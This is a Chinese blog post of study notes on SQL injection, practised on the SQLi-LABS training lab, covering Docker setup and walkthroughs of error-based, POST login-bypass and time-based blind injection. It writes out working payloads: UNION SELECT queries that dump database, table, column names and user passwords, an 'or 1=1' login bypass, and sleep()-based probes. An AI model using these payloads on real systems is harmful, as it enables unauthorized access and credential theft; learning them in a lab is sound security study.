---
title: SQL注入
date: 2020-05-01 19:00:01
tags: SQL
---

一些教程的记录:

* 来自CSDN  [通过sqli-labs学习sql注入——基础挑战之less1-10](https://blog.csdn.net/u012763794/article/details/51207833)

* 来自知乎  [SQL注入：Error Based Injection](https://zhuanlan.zhihu.com/p/74907340)

* 来自i春秋 [从基础开始:](https://bbs.ichunqiu.com/thread-9518-1-1.html)

* 一本书: 链接:<http://pan.baidu.com/share/link?shareid=1082654025&uk=3477169565>  密码: vhus

SQLi-LABS是	印度程序员（GitHub用户名Audi-1）写的一个用于学习SQL注入的教程。此教程包含的脚本可以在用户本地的MYSQL中创建一系列数据库，使用localhost访问以作为靶机进行练习。

实际上，网上已经有一个已经搭建好的靶机，运行于腾讯云的Ubuntu操作系统上，地址为<http://111.231.88.117/sqli_lab/sqli-labs-php7/>.不过这个不是我搭建的,如果不能用了不要找我.  =_=

## 配置环境:mysql+Apache

不建议在Windows上配置环境,除非本来电脑上没有MySQL,这时可以用PHPstudy这个集成环境.

### Apache的注意事项

<https://blog.csdn.net/maq56310/article/details/80580286>

如果443端口被占用,可以用

    netstat -ano //查看端口号对应的pid
    taskkill /f /pid 1234 //杀死1234进程,也可在任务管理器中杀死.

conf/httpd.conf的监听端口默认为80,改为8088解决

Sqli-labs文件夹应该放在C:\Apache24\htdocs下,而不是网上所有的其他博客说的web或者www

启动只能用 <http://localhost:8088/Sqli-labs/> ,不能用IP地址,不然打不开

实际上,Windows环境下搜到的各种解决方法都是不可用的,并且存在破坏本机环境的情况,我的mysql就不能用了.改用macos

### 在macOS上配置环境

很简单,首先安装docker,然后

    sudo docker pull acgpiano/sqli-labs

如果网络错误,建议开全局代理,之后

    docker run -dt --name sqli-lab -p 80:80 acgpiano/sqli-labs:latest

第一个80是主机的端口,将docker内的环境映射到物理机的80端口中

浏览器打开localhost即可访问

重启以后,需要

    docker stop sqli-lab
    docker rm sqli-lab
    docker run -dt --name sqli-lab -p 80:80 acgpiano/sqli-labs:latest

并且在网页里需要重新建数据库

## 基于错误的

### Less1 单引号注入,字符串,get

get是直接把参数写在URL里面的(-_-)!

MySQL中的注释是-- (两个减号一个空格,在URL中,最后的空格会被去掉,因此使用的时候用的是--+)

输入 ?id=1 返回 

    Your Login name:Dumb
    Your Password:Dumb

数字改成2,返回另外两个name和password

输入 ?id=2' 返回 

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''2'' LIMIT 0,1' at line 1

猜测SQL语句是 select xxx from xxx where '' limit 0,1

#### 获取列数

试图获取其他的信息需要使用union语句.union语句需要前面的结果和后面的结果的列数相同,因此需要得到原有的SQL语句查询结果中共有几列.接下来试图获取表的列数,方法是使用order by.在URL中输入:

	?id=1 order by 3 --+

可以正常返回结果,说明该表至少有三列.确定列数,只要order by 后面的数字一个一个试就可以了.由于最开始时已经返回了两个值,所以从3开始试即可.这个表中,试到4,即

    ?id=1 order by 4 --+

就出现了错误提示,所以共有三列.

而实际上页面回显的语句只有两个,因此需要知道显示的是哪两列,输入

    ?id=-1’ union select 1,2,3 --+

结果会显示数字2,3所以可知显示的是第2,3列.由于结果只显示第一行查询结果,这行语句中,id=-1使得union左边的语句查询结果为空以显示右边自行构造的SQL语句的结果,-1也可替换为其他的猜测不存在的数字.

#### 获取其他信息

数据库名:

    -1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+

group_concat让结果变成一行,因为返回的结果只显示一行=_=

表名:

    ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= 'security' --+

列名:

    ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name= 'users' --+ 得到列名为id,username,password

数据表: 
    ?id=-1’ union select 1,group_concat(username),group_concat(password) from users --+ 

### less2,3,4 基于错误的

经过艰难的测试,靶机1,2,3,4的SQL语句实际上大同小异,区别主要在id被什么符号包裹在内,写出正确的闭合的SQL语句即可.他们可能被包裹在括号,双引号,单引号,或者前面几个的组合(或者啥也没有)的里面,只要有几个错误多试几次就容易看出来.

### less11 Post类型
 单引号
这个就是我们看见的输入账号和密码的类型了

用户名输入:**database()--+**, 密码输入**1=1 --**,报错:**…use near 'database()--+' and password='1=1 --' LIMIT 0,1' at line 1**.从这里看出,用户名和密码的验证是在同一行的,并且先验证用户名,那么我们在用户名的位置添加注释,尝试填写用户名为**aaa’or 1=1 – (此处有空格)**,密码填入**123**(密码可以不填),显示登陆成功,输出提示:**Your Login name:Dumb Your Password:Dumb.**

这个其实很简单,发现用户名和密码在同一行,那么在用户名那个地方填写注入语句即可.

### 布尔,时间,盲注

这种类型的SQL注入是最繁琐的.无论URL中的参数输入什么,都返回同一句话.

这样以上基于错误的方式就不能奏效了.因此采用另一种方法,利用if()和sleep(),观察网页加载的时间,从而判断语句是否正确执行.尝试: ?id=1' and sleep(3) --+,发现网页加载明显有延迟,说明注入成功.获取数据库名等的方法也与有回显的注入方法完全不一样.简而言之,没有回显的注入需要猜测或者穷举(可以用二分法查找,更快)结果中的每一个字符,来获得想要的结果.

获取数据库名称长度: ?id=1' and if(length(database())=8 , sleep(3), 1) --+,这行语句有明显加载延迟,说明数据库名称长度是8.在实际编写的脚本中往往使用不等号,减小猜测的时间复杂度.

获取数据库名: ?id=1' and if(left(database(),1)='s' , sleep(3), 1) --+,得知数据库名的第一个字符为s.同样,一般用ascii()方法将字符转换成数字,这样可以用二分法减小时间复杂度.比如 ?id=1' and if(((ascii(substr(database(),0,1)))>100),sleep(3),0)--+.

布尔盲注的手动操作非常繁琐,因此往往都是用脚本执行的.获取其他信息的方法类似,不再赘述.
